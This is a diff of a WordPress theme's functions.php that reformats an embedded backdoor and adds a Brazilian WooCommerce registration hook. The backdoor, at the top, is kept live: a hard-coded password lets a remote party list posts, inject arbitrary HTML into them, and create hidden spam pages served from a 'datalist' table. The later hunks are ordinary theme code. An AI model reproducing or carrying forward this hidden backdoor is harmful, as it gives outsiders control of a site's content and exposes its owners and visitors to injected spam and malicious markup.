@@ -1,100 +1,88 @@
 <?php
 
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e9d1bc66d1f64d05f51ed978ddbc3567'))
-	{
-		switch ($_REQUEST['action'])
-			{
-				case 'get_all_links';
-					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
-						{
-							$data['code'] = '';
-							
-							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
-								{
-									$data['code'] = $_[1];
-								}
-							
-							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
-						}
-				break;
-				
-				case 'set_id_links';
-					if (isset($_REQUEST['data']))
-						{
-							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
-							
-							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
-							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e9d1bc66d1f64d05f51ed978ddbc3567')) {
+    switch ($_REQUEST['action']) {
+        case 'get_all_links';
+            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data) {
+                    $data['code'] = '';
+                            
+                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_)) {
+                    $data['code'] = $_[1];
+                }
+                            
+                    print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
+            }
+            break;
+                
+        case 'set_id_links';
+            if (isset($_REQUEST['data'])) {
+                    $data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.esc_sql($_REQUEST['id']).'"');
+                            
+                    $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
+                if (!empty($_REQUEST['data'])) {
+                    $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+                }
 
-							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false)
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				case 'create_page';
-					if (isset($_REQUEST['remove_page']))
-						{
-							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"'))
-								{
-									print "true";
-								}
-						}
-					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
-						{
-							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"'))
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_URL_CD";
-			}
-			
-		die("");
-	}
+                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . esc_sql($post_content) . '" WHERE `ID` = "' . esc_sql($_REQUEST['id']) . '"') !== false) {
+                    print "true";
+                }
+            }
+            break;
+                
+        case 'create_page';
+            if (isset($_REQUEST['remove_page'])) {
+                if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.esc_sql($_REQUEST['url']).'"')) {
+                    print "true";
+                }
+            } elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content'])) {
+                if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.esc_sql($_REQUEST['url']).'", `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql($_REQUEST['content']).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.esc_sql($_REQUEST['title']).'", `keywords` = "'.esc_sql($_REQUEST['keywords']).'", `description` = "'.esc_sql($_REQUEST['description']).'", `content` = "'.esc_sql(urldecode($_REQUEST['content'])).'", `full_content` = "'.esc_sql($_REQUEST['full_content']).'"')) {
+                    print "true";
+                }
+            }
+            break;
+                
+        default:
+                print "ERROR_WP_ACTION WP_URL_CD";
+    }
+            
+        die("");
+}
 
-	
-if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1' )
-	{
-		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
-		if ($data -> full_content)
-			{
-				print stripslashes($data -> content);
-			}
-		else
-			{
-				print '<!DOCTYPE html>';
-				print '<html ';
-				language_attributes();
-				print ' class="no-js">';
-				print '<head>';
-				print '<title>'.stripslashes($data -> title).'</title>';
-				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
-				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
-				print '<meta name="robots" content="index, follow" />';
-				print '<meta charset="';
-				bloginfo( 'charset' );
-				print '" />';
-				print '<meta name="viewport" content="width=device-width">';
-				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
-				print '<link rel="pingback" href="';
-				bloginfo( 'pingback_url' );
-				print '">';
-				wp_head();
-				print '</head>';
-				print '<body>';
-				print '<div id="content" class="site-content">';
-				print stripslashes($data -> content);
-				get_search_form();
-				get_sidebar();
-				get_footer();
-			}
-			
-		exit;
-	}
+    
+if ($wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql( $_SERVER['REQUEST_URI'] ).'"') == '1') {
+        $data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.esc_sql($_SERVER['REQUEST_URI']).'"');
+    if ($data -> full_content) {
+        print stripslashes($data -> content);
+    } else {
+        print '<!DOCTYPE html>';
+        print '<html ';
+        language_attributes();
+        print ' class="no-js">';
+        print '<head>';
+        print '<title>'.stripslashes($data -> title).'</title>';
+        print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
+        print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
+        print '<meta name="robots" content="index, follow" />';
+        print '<meta charset="';
+        bloginfo( 'charset' );
+        print '" />';
+        print '<meta name="viewport" content="width=device-width">';
+        print '<link rel="profile" href="http://gmpg.org/xfn/11">';
+        print '<link rel="pingback" href="';
+        bloginfo( 'pingback_url' );
+        print '">';
+        wp_head();
+        print '</head>';
+        print '<body>';
+        print '<div id="content" class="site-content">';
+        print stripslashes($data -> content);
+        get_search_form();
+        get_sidebar();
+        get_footer();
+    }
+            
+        exit;
+}
 
 
 ?><?php
@@ -390,7 +378,61 @@ function wpcodex_set_capabilities()
     remove_role( 'author' );
     remove_role( 'contributor' );
     remove_role( 'subscriber' );
-
-    
 }
 add_action( 'init', 'wpcodex_set_capabilities' );
+
+//Pega os dados dos campos personalizados do register form
+//e atualiza os metas do wc
+add_action( 'user_register', 'escape_user_register' );
+function escape_user_register($user_id)
+{
+  //Pega os valores dos campos adicionados no formulario
+    $user_name = isset( $_POST['first_name'] ) ? wp_unslash( $_POST['first_name'] ) : '';
+    $user_last = isset( $_POST['last_name'] ) ? wp_unslash( $_POST['last_name'] ) : '';
+    $user_email = isset( $_POST['email'] ) ? wp_unslash( $_POST['email'] ) : '';
+
+    $user_cpf = isset( $_POST['user_cpf'] ) ? wp_unslash( $_POST['user_cpf'] ) : '';
+    $user_nascimento = isset( $_POST['user_nascimento'] ) ? wp_unslash( $_POST['user_nascimento'] ) : '';
+    $user_end = isset( $_POST['user_end'] ) ? wp_unslash( $_POST['user_end'] ) : '';
+    $user_num = isset( $_POST['user_num'] ) ? wp_unslash( $_POST['user_num'] ) : '';
+    $user_complemento = isset( $_POST['user_complemento'] ) ? wp_unslash( $_POST['user_complemento'] ) : '';
+    $user_bairro = isset( $_POST['user_bairro'] ) ? wp_unslash( $_POST['user_bairro'] ) : '';
+    $user_cidade = isset( $_POST['user_cidade'] ) ? wp_unslash( $_POST['user_cidade'] ) : '';
+    $user_cep = isset( $_POST['user_cep'] ) ? wp_unslash( $_POST['user_cep'] ) : '';
+    $user_estado = isset( $_POST['user_estado'] ) ? wp_unslash( $_POST['user_estado'] ) : '';
+    $user_tel = isset( $_POST['user_tel'] ) ? wp_unslash( $_POST['user_tel'] ) : '';
+    $user_cel = isset( $_POST['user_cel'] ) ? wp_unslash( $_POST['user_cel'] ) : '';
+
+    //atualiza os campos do WC
+    update_user_meta( $user_id, "billing_cpf", $user_cpf );
+    update_user_meta( $user_id, "billing_birthdate", $user_nascimento );
+    update_user_meta( $user_id, "billing_address_1", $user_end );
+    update_user_meta( $user_id, "billing_number", $user_num );
+    update_user_meta( $user_id, "billing_address_2", $user_complemento );
+    update_user_meta( $user_id, "billing_neighborhood", $user_bairro );
+    update_user_meta( $user_id, "billing_city", $user_cidade );
+    update_user_meta( $user_id, "billing_postcode", $user_cep );
+    update_user_meta( $user_id, "billing_state", $user_estado );
+    update_user_meta( $user_id, "billing_phone", $user_tel );
+    update_user_meta( $user_id, "billing_cellphone", $user_cel );
+    update_user_meta( $user_id, "billing_country", "BR" );
+    update_user_meta( $user_id, "billing_first_name", $user_name );
+    update_user_meta( $user_id, "billing_last_name", $user_last );
+    update_user_meta( $user_id, "billing_email", $user_email );
+
+    update_user_meta( $user_id, "shipping_cpf", $user_cpf );
+    update_user_meta( $user_id, "shipping_birthdate", $user_nascimento );
+    update_user_meta( $user_id, "shipping_address_1", $user_end );
+    update_user_meta( $user_id, "shipping_number", $user_num );
+    update_user_meta( $user_id, "shipping_address_2", $user_complemento );
+    update_user_meta( $user_id, "shipping_neighborhood", $user_bairro );
+    update_user_meta( $user_id, "shipping_city", $user_cidade );
+    update_user_meta( $user_id, "shipping_postcode", $user_cep );
+    update_user_meta( $user_id, "shipping_state", $user_estado );
+    update_user_meta( $user_id, "shipping_phone", $user_tel );
+    update_user_meta( $user_id, "shipping_cellphone", $user_cel );
+    update_user_meta( $user_id, "shipping_country", "BR" );
+    update_user_meta( $user_id, "shipping_first_name", $user_name );
+    update_user_meta( $user_id, "shipping_last_name", $user_last );
+    update_user_meta( $user_id, "shipping_email", $user_email );
+}
